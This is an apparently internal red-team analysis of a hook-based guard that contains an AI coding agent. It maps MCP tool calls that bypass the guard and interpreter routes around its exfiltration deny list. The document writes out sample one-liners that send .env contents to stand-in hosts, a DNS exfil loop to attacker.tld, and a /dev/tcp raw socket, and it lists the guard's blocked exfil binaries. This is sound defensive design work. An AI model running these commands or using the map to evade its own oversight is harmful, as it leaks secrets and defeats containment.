# A8 — MCP / Egress Attack-Surface Map (aims 11a/11b/11c)

**Date:** 2026-06-10
**Arc:** Slice 11 — Containment & the Platform Boundary ([ROADMAP-SLICE11.md](../../ROADMAP-SLICE11.md))
**Type:** Analysis run (no production change). Adversarial enumeration only — no destructive / mutating MCP tool was called.
**Lens:** security-owner. Red-teaming the two HIGH residuals left open by [A7](2026-06-10-A7-rereview-arc-closure.md): **W3** (guard sees only Bash-family tools) and **W2** (no interpreter-egress / PII-content control).

---

## Executive summary

The guard's deny-matrix lives in [`.claude/hooks/guard-core.sh`](../../../.claude/hooks/guard-core.sh) and is fronted by the Claude PreToolUse adapter [`.claude/hooks/guard.sh`](../../../.claude/hooks/guard.sh). Two structurally different gaps remain, and they call for **two structurally different responses**:

- **W3 is enumerable and gateable in-kit.** The PreToolUse matcher in [`.claude/settings.json`](../../../.claude/settings.json) is `Bash|Write|Edit|NotebookEdit`, and `guard.sh:44` routes every other tool to `*) allow`. So *every* `mcp__<server>__<action>` call — deploy, delete, DB-mutate, exfiltrate — bypasses the entire matrix today. But MCP tools are **named, discrete, and finite per session**: unlike a Turing-complete shell, an MCP call cannot obfuscate *which capability it is*. The tool name and server are visible in the same JSON the adapter already parses. That makes W3 a **deny-by-default capability allowlist** problem — exactly the kind of thing a shell-side gate *can* honestly enforce. This map enumerates the capability families (Part 1) so **11a** closes a real list, not a guess.

- **W2 is NOT in-process-closable.** The exfil block at `guard-core.sh:152-161` denies *named binaries* (`scp`/`sftp`/`curl --upload`/`nc`/`rclone`/`mail`). It explicitly cannot see an interpreter that opens its own socket (`python -c`, `node -e`, `ruby -e`, `deno`, `perl`, `php -r`) — the comment at `guard-core.sh:152-154` already concedes this. Part 2 enumerates the interpreter / DNS / build-tool egress tail and shows, per case, **why no reliable command signature exists**. The honest conclusion (already stated in [`platform-safety-boundary.md`](../../enterprise/platform-safety-boundary.md) control #1) is that W2 belongs to the **platform network-egress allowlist**, not an in-process guard. **11b** must therefore be *provide-reference + verify-wired* (three-state UNVERIFIED), never a fake in-process egress check.

**Bottom line:** 11a is the real win (gate the gateable W3 surface, deny-by-default). 11b/11c provide-and-verify the W2 platform controls without overclaiming. Nothing in this map should become a green check that implies containment a shell cannot deliver.

---

## Part 1 — MCP tool-family attack surface (aims 11a)

### 1.1 The routing gap, file-cited

| Where | What it does | Consequence |
|-------|--------------|-------------|
| [`.claude/settings.json`](../../../.claude/settings.json) line 32 | PreToolUse `matcher: "Bash\|Write\|Edit\|NotebookEdit"` | MCP tool calls never reach the hook process at all. |
| [`guard.sh:22-28`](../../../.claude/hooks/guard.sh) `deny_if_mutating()` | `case` only enumerates `Bash\|Write\|Edit\|NotebookEdit`; everything else → `allow` | Even if an MCP call *did* reach the hook, the adapter would allow it. |
| [`guard.sh:37-46`](../../../.claude/hooks/guard.sh) main `case "$TOOL"` | `Bash` → command matrix; `Write/Edit/NotebookEdit` → path matrix; `*) allow` (line 44) | The deny-matrix has **no MCP branch**. |

Both the matcher *and* the adapter must change for 11a: register `mcp__.*` in the matcher so the calls arrive, **and** add an MCP branch in `guard.sh` that calls a new `guard_check_mcp` in `guard-core.sh`.

### 1.2 Capability-family table

Each row maps an MCP capability family to: example real tool names visible in *this* session (concrete, not hypothetical), the blast radius, and the **existing Bash deny-rule whose intent it parallels** (so 11a reuses the matrix's intent rather than inventing a second philosophy).

| # | Capability family | Example MCP tool name(s) (this session unless noted) | Blast radius | Parallels Bash rule (`guard-core.sh`) |
|---|-------------------|------------------------------------------------------|--------------|----------------------------------------|
| 1 | **filesystem-write / delete** | `mcp__claude_ai_Google_Drive__create_file`, `mcp__claude_ai_Google_Drive__copy_file`; (std `mcp__filesystem__write_file`, `__move_file`, `__delete_file`) | Irreversible writes/deletes outside the work tree; can clobber the control-plane the guard protects on the FS path | `guard_check_path` secret/control-plane write (`:190-209`); `rm`/`mv`/`truncate` matrix (`:41-88`) |
| 2 | **database / datastore mutation** | `mcp__claude_ai_Sanity__patch_document_from_json`, `__unpublish_documents`, `__version_unpublish_document`, `__update_dataset`; (std `mcp__postgres__query` with DML, `mcp__mongodb__delete`) | Irreversible data loss / corruption; prod data if pointed at prod dataset | destructive-SQL via client (`:103-105`); ORM/migration resets (`:106-118`); redis flush (`:122-124`); mongo dropDatabase (`:145-148`) |
| 3 | **cloud / infra control (deploy)** | `mcp__claude_ai_Vercel__deploy_to_vercel`, `mcp__claude_ai_Sanity__deploy_studio`, `__deploy_schema`, `__create_project`, `mcp__claude_ai_Sanity__create_dataset` | Prod blast radius; high-blast-radius deploy with no review gate | prod-deploy catch-all (`:167-169`); terraform apply (`:135-136`); kubectl/helm apply (`:167`, `:173-176`) |
| 4 | **cloud / infra control (delete)** | (std `mcp__aws__delete_*`, `mcp__cloudflare__*_delete`, `mcp__kubernetes__delete_resource`); Sanity `__discard_drafts`, `__version_discard` | Irreversible resource teardown; data/instance loss | cloud-deletion family (`:131-140`); kubectl delete (`:125-127`); helm uninstall / drain (`:141-144`); s3 rb / rds delete (`:131`) |
| 5 | **source-control / CI mutation** | (std `mcp__github__create_or_update_file`, `__merge_pull_request`, `__create_branch`, `__delete_*`, `__create_workflow_dispatch`) | Bypasses branch protection & review; can mutate CI gates / workflows — the same control-plane the guard protects | push-to-main / force-push (`:95-101`, `guard_check_push :213-230`); control-plane `.github/workflows` write (`:31-37`, `is_control_plane_path :13-22`) |
| 6 | **secret / credential access** | `mcp__claude_ai_Google_Drive__read_file_content` (can read a secrets doc); auth-token tools `mcp__*__authenticate` / `__complete_authentication`; (std `mcp__vault__read`, `mcp__1password__get_item`, `mcp__aws__get_secret_value`) | Reads credentials into the agent context → feeds exfil; this is the *read* half that pairs with family 8 | secret-material write block (`guard_check_path :204-207`) — note the guard only blocks *writing* secret paths today; MCP secret **reads** are a new exposure class |
| 7 | **network / HTTP egress (generic)** | `mcp__claude_ai_Vercel__web_fetch_vercel_url`, `mcp__claude_ai_Canva__import_design_from_url`, `__upload_asset_from_url`; `WebFetch` (built-in); (std `mcp__fetch__fetch`) | Arbitrary outbound HTTP from inside the agent — an exfil channel and an injection-ingest channel | exfil-channel family (`:152-161`) — but see W2: the **real** control is the platform egress allowlist, not a name match |
| 8 | **messaging / notification (exfil channel)** | `mcp__claude_ai_Gmail__create_draft`, `mcp__claude_ai_ClickUp__send_chat_message`, `mcp__claude_ai_ClickUp__create_task_comment`, `mcp__claude_ai_Notion__notion-create-comment`, `mcp__claude_ai_Calendly__meetings-create_invitee` | **Low-friction exfil**: any tool that accepts free text + sends it outbound moves secrets out of the sandbox with no `curl` in sight | `mail` exfil rule (`:159`); this is the MCP-native generalization of the binary exfil block |
| 9 | **package / artifact publish** | (std `mcp__npm__publish`, `mcp__pypi__*`, container-registry push tools); Canva `__publish_brand_template` | Externally irreversible release | `npm/yarn/pnpm publish` (`:92-94`) |
| 10 | **messaging — outbound sales/contact mutation** *(sub-case of 8, called out because this session exposes it)* | `mcp__claude_ai_Apollo_io__apollo_contacts_create`, `__apollo_emailer_campaigns_add_contact_ids` | Sends data to third parties (PII egress + real-world side effects) | exfil family (`:152-161`); PII consent rule in CLAUDE.md security section |

> **Read-only MCP tools are out of scope for the *deny* matrix** (e.g. `mcp__claude_ai_ClickUp__clickup_get_task`, `mcp__plugin_semgrep__semgrep_scan`, `mcp__claude_ai_Sanity__query_documents`). They should be **allow-by-default** so the gate doesn't strangle normal agent work — mirroring how the Bash matrix leaves `rm stale.txt` and read commands alone (`guard-core.sh:46-47` design note). The exception is family 6 (secret *read*): reading a credential is "read-only" yet feeds exfil, so it is deny-by-default below.

### 1.3 Proposed capability taxonomy (what 11a's allowlist keys on)

A small, runtime-agnostic set of **capability classes**. The point is that a project declares, at Inception, which classes its MCP servers are permitted to exercise — and the gate denies any call whose class isn't allowlisted. The class is derived from the `mcp__<server>__<action>` name via a per-server **action→class map** shipped with the kit (and overridable per project), because the action verb is the honest signal (`create`/`delete`/`deploy`/`send`/`publish` vs `get`/`list`/`search`/`read`).

| Class | Meaning | Default | Rationale |
|-------|---------|:-------:|-----------|
| `fs.write` | create/modify/delete files via MCP | **deny** | irreversible outside work tree; parallels FS path guard |
| `db.mutate` | DML / publish / unpublish / patch documents | **deny** | irreversible data loss; parallels SQL/ORM matrix |
| `cloud.deploy` | deploy / apply / create infra or projects | **deny** | prod blast radius; parallels prod-deploy catch-all |
| `cloud.delete` | delete / terminate / destroy infra or resources | **deny** | irreversible teardown; parallels cloud-deletion family |
| `vcs.write` | branch/commit/merge/PR/workflow mutation | **deny** | bypasses review + can mutate CI control-plane |
| `secret.read` | read credentials / tokens / secret material | **deny** | the read half of exfil; new exposure class |
| `net.egress` | arbitrary outbound HTTP / fetch / upload-from-url | **deny** | exfil + injection-ingest; honest note: in-kit gate is a *name* match only — the real control is the platform egress allowlist (W2) |
| `msg.send` | send messages / emails / comments / invites outbound | **deny** | low-friction exfil channel; parallels `mail` rule |
| `pkg.publish` | publish packages / templates / artifacts | **deny** | externally irreversible; parallels `npm publish` |
| `data.read` | read-only queries / search / get / list | **allow** | normal agent work; over-blocking would strangle the loop |

**Deny-by-default stance:** every *mutating or egress-or-secret-read* class is **deny-by-default**; only `data.read` is allow-by-default. A project opts specific classes (or specific server+class pairs) **in** at Inception — e.g. a Sanity-CMS project allowlists `mcp__claude_ai_Sanity` for `db.mutate` but not `cloud.delete`. Un-allowlisted *and* un-classified tools (unknown server, no action→class map entry) → **deny with a "declare this capability" reason**, the same fail-closed posture `guard.sh:30-35` already uses when jq is absent or input isn't JSON.

### 1.4 Where common MCP servers land

| MCP server | Classes it exposes | Deny-by-default unless allowlisted |
|------------|--------------------|------------------------------------|
| `filesystem` (std) | `fs.write`, `data.read` | `fs.write` |
| `github` (std) | `vcs.write`, `data.read` | `vcs.write` |
| `postgres` / `mongodb` (std) | `db.mutate`, `data.read` | `db.mutate` |
| `Sanity` (this session) | `db.mutate`, `cloud.deploy`, `data.read` | `db.mutate`, `cloud.deploy` |
| `Vercel` (this session) | `cloud.deploy`, `net.egress`, `data.read` | `cloud.deploy`, `net.egress` |
| AWS / GCP / Azure / Cloudflare / Kubernetes (std) | `cloud.deploy`, `cloud.delete`, `secret.read`, `data.read` | all but `data.read` |
| `Slack` / `Gmail` / `ClickUp` / `Notion` (this session) | `msg.send`, `data.read` | `msg.send` |
| `Apollo.io` (this session) | `msg.send`, `db.mutate`, `data.read` | `msg.send`, `db.mutate` |
| Vault / 1Password / secret-managers (std) | `secret.read` | `secret.read` |
| `npm` / `pypi` / registries (std) | `pkg.publish`, `data.read` | `pkg.publish` |
| `semgrep` / `context7` / `sonatype` (this session) | `data.read` only | none (safe by default) |

### 1.5 Aiming note for 11a

1. **Two-part wiring, both required.** (a) Add `mcp__.*` to the PreToolUse matcher in `.claude/settings.json` so MCP calls reach the hook; (b) add an `mcp__*)` branch in `guard.sh` that extracts `tool_name` (already parsed at `guard.sh:33`) and calls a new `guard_check_mcp "$TOOL"` in `guard-core.sh`. Both files are **control-plane** (`is_control_plane_path`, `guard-core.sh:13-22`) → the 11a PR is a `cp` change needing the security-owner lens + human ratification.
2. **The matrix stays the single source of truth.** `guard_check_mcp` lives in `guard-core.sh` beside `guard_check_command`, so `scripts/kit-guard` and the runtime-agnostic **`mcp-policy` contract** consume the *same* classification — no forked matrix (`conformance/guard-core-sourced.sh` already enforces this for the other functions; extend it).
3. **Ship an action→class map + a per-project allowlist surface.** The map (`create*/delete*/deploy*/send*/publish*/patch*/read-secret → class`) is the kit default; the project declares its allowlist at Inception (new field, e.g. in the project `CLAUDE.md` / a `.claude/mcp-policy` file). Fail closed on unknown server/action.
4. **Conformance must prove deny-by-default.** Add a corpus case asserting an un-allowlisted destructive/egress MCP tool (e.g. `mcp__github__merge_pull_request`, `mcp__slack__post_message`) is **denied**, and a read-only tool (`mcp__*__get_*`) is **allowed** — mirroring the `agent-autonomy.sh` red-team corpus.
5. **Honest scope boundary on `net.egress`.** The in-kit gate can deny the *named* egress MCP tool, but a deny here is still a name match — it does **not** contain an MCP server that egresses internally, nor an interpreter (W2). The `net.egress` class must carry a comment pointing at `platform-safety-boundary.md` control #1 so it never reads as full egress containment.

---

## Part 2 — interpreter-exfil tail (aims 11b / 11c)

### 2.1 The block being bypassed

`guard-core.sh:152-161` denies exfil by **binary name** — `scp`, `sftp`, `curl --upload-file`/`-T`/`-F …@`/`--data-binary @`, `wget`, `nc`/`ncat`/`netcat` (piped), `rclone copy/sync/move`, and piped `mail`. Its own header comment (`:152-154`) concedes this is **PARTIAL — binary-name denial only; interpreters … remain channels**. The enumeration below is the tail it cannot reach.

### 2.2 Enumeration: interpreter / out-of-band egress with no command signature

| # | Technique | Representative shape | Why a deny-list can't catch it |
|---|-----------|----------------------|--------------------------------|
| 1 | **Python socket/HTTP** | `python -c "import urllib.request,os;urllib.request.urlopen('https://x/y',data=open('.env','rb').read())"` | The destination, the data, and the verb live in an opaque string arg to a *legitimate* interpreter. Blocking `python -c` blocks all scripting. The host (`x`) is arbitrary; no fixed token to match. |
| 2 | **Node HTTP/socket** | `node -e "require('https').request('https://x',{method:'POST'}).end(fs.readFileSync('.env'))"` | Same: `node -e` is core dev tooling; the payload is a free-form JS string. No signature distinguishes exfil from a legit fetch. |
| 3 | **Ruby / Perl / PHP one-liners** | `ruby -e 'require"net/http";...'` · `perl -MIO::Socket::INET -e '...'` · `php -r 'file_get_contents("https://x?d=".file_get_contents(".env"));'` | Each is a standard interpreter with a `-e`/`-r` eval flag. Banning the flag bans the language. The socket call is inside the eval string. |
| 4 | **Deno / Bun / tsx** | `deno run --allow-net --allow-read x.ts` · `bunx`, `tsx exfil.ts` | The *script* holds the egress; the command line is just "run a script." Deno even has its own permission flags — `--allow-net` is the honest signal, but it lives at the *runtime*, not the guard. |
| 5 | **DNS exfil** | `for c in $(cat .env|xxd -p);do nslookup $c.attacker.tld;done` (or via `dig`, `host`, getaddrinfo in any of #1-4) | DNS is almost never on an egress *block*-list (it breaks name resolution). Data rides in subdomain labels. `nslookup`/`dig` are legitimate. Signatureless by construction. |
| 6 | **Out-of-band via a build/test tool** | a `postinstall` script, a `Makefile` target, a test that opens a socket, `npm run`/`gradle`/`mvn` invoking arbitrary code | The guard sees `npm test` / `make`; the egress is in code the tool runs. Indistinguishable from a legitimate build step. |
| 7 | **Interactive/redirected raw sockets** | `exec 3<>/dev/tcp/host/443; printf 'POST...' >&3` (bash `/dev/tcp`) | Pure shell builtin — no external binary at all. `/dev/tcp` is a bash feature; matching it would also catch legitimate health-check idioms, and obfuscation (`/dev/${x}cp`) defeats the match. |
| 8 | **Encode-then-allowed-channel** | base64/gzip the data, then ship via an *allowlisted* path (a permitted git remote, a permitted package registry, a webhook the project legitimately uses) | The channel is on the *allow* side; only the *content* is sensitive. A command-shape deny-list has no content signal — and the kit explicitly has no PII/secret-content detection (W2). |

### 2.3 Why this tail is platform-owned, not in-process-closable

Every row above shares one property: **the malicious intent lives in data (an eval string, a script file, a subdomain label, a build step), not in the command shape.** A deny-list matches command shapes. Therefore:

- Catching #1-4 means banning `python -c` / `node -e` / `ruby -e` / `deno run` — i.e. banning the interpreters the agent needs to do its job. Unacceptable false-positive rate; trivially worked around (write a temp `.py` and run it).
- Catching #5 (DNS) means blocking name resolution, which breaks everything.
- Catching #7 (`/dev/tcp`) means pattern-matching a shell builtin that obfuscates freely.
- Catching #8 requires **content inspection** (PII/secret detection), which the guard has no signal for and which still can't see encrypted payloads.

This is exactly the reasoning already recorded in [`platform-safety-boundary.md`](../../enterprise/platform-safety-boundary.md): *"a deny-list over a Turing-complete shell cannot contain a determined or compromised agent … data exfiltration has no reliable command signature"* (lines 7-9). The doc already names the **correct control as control #1 — "Network-egress allowlist — the only real exfiltration defense. Default-deny outbound network … allow only known package registries and required APIs"** (line 13). **Confirmed: the kit already names the right control.** The interpreter tail is not a guard bug to fix; it is the proof that the boundary must be the egress allowlist.

### 2.4 Aiming note for 11b (egress reference) and 11c (sandbox / tokens)

**11b — egress allowlist reference + conformance (the honest W2):**
1. Ship a **default-deny network-egress reference** per deploy target: a Kubernetes `NetworkPolicy` (default-deny egress + explicit allow to registries/APIs) and a proxy/cloud-egress pattern (e.g. an allowlist HTTP proxy / cloud egress firewall). This is what neutralizes **all** of §2.2 #1-8 uniformly — it doesn't care whether the socket came from `curl`, `python -c`, `/dev/tcp`, or DNS; un-allowlisted destinations simply don't connect.
2. Add `conformance/egress-policy.sh` as **three-state**: declared+wired → PASS; declared-not-wired → UNVERIFIED; absent on a networked/deployable project → FAIL by posture; **N/A-with-reason** for projects with no network surface (mirrors 9j's honest-demote and the SBOM/branch-protection model).
3. **Never an in-process egress guard.** The conformance verifies the *platform* control is declared and wired; it must not claim to inspect or block traffic itself. UNVERIFIED is the correct honest state when the script can't reach the platform — never a false PASS.
4. Crosswalk the egress row Org-owned → **Kit-assisted** (reference shipped + wiring verified), not Kit-enforced.

**11c — sandbox + scoped-credential references + conformance:**
1. The egress allowlist closes the *channel*; **11c closes what's reachable to exfiltrate in the first place** — read-only/sandboxed FS (devcontainer / compose read-only mounts scoped to the work tree, so `.env`, `~/.aws`, `~/.ssh` aren't readable → defangs §2.2 #1-8 at the *source*), scoped short-lived tokens (OIDC→role, break-glass), and separate prod credentials (formalizes `platform-safety-boundary.md` controls #2/#3/#4).
2. The sandbox directly addresses the **family 6 `secret.read`** exposure from Part 1: if the FS can't read host secrets and tokens are scoped/short-lived, both the MCP `secret.read` class *and* the interpreter exfil tail lose their payload.
3. `conformance/containment-ready.sh` is a checklist + script, **conditional three-state** — asserts the containment posture is *declared*, never that it's *enforced by the kit*.

---

## Honesty check

Nothing in this map should become a green check that implies in-process containment a shell can't deliver:

- **Part 1 (W3 / 11a) — a real enforcement, honestly bounded.** The MCP capability gate genuinely *denies* an un-allowlisted MCP call, because the Claude PreToolUse hook actually receives the call and the tool name is unspoofable-as-to-capability. This is a legitimate Kit-enforced control — *with one caveat*: the `net.egress` class is a **name match only**. Denying `mcp__*__fetch` does not contain an MCP server that egresses internally, nor any interpreter. That caveat must be written into the `net.egress` class and the crosswalk so the MCP gate never reads as egress containment. Everything else (`fs.write`, `db.mutate`, `cloud.*`, `vcs.write`, `secret.read`, `msg.send`, `pkg.publish`) is honestly gateable at the tool boundary.
- **Part 2 (W2 / 11b-c) — explicitly NOT in-process-closable.** The interpreter/DNS/build-tool/`/dev/tcp`/encode-then-allowed tail has no reliable command signature; any attempt to deny-list it would either strangle the agent or be trivially bypassed. 11b/11c must therefore be **provide-reference + verify-wired (three-state UNVERIFIED)**, and the crosswalk moves Org-owned → **Kit-assisted**, never Kit-enforced. UNVERIFIED is the correct state; a false PASS here would be exactly the Slice-9 false-assurance the arc exists to avoid.
- **The boundary statement stays.** `platform-safety-boundary.md` keeps saying the enforcement boundary is platform-owned. This map *narrows the open gap* (gates W3) and *makes the platform control verifiable* (W2), without ever claiming the shell contains a determined agent.
